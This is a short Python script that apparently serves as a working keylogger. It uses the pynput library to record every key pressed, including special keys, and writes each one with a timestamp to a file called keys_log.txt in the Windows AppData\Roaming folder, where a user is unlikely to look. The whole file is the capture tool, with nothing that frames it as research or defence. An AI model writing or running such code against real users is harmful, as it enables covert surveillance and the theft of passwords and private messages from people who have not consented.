from pynput import keyboard
import logging
import os

# Set log file path
log_dir = os.path.expanduser("~\\AppData\\Roaming")
log_file = os.path.join(log_dir, "keys_log.txt")

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define what to do on key press
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
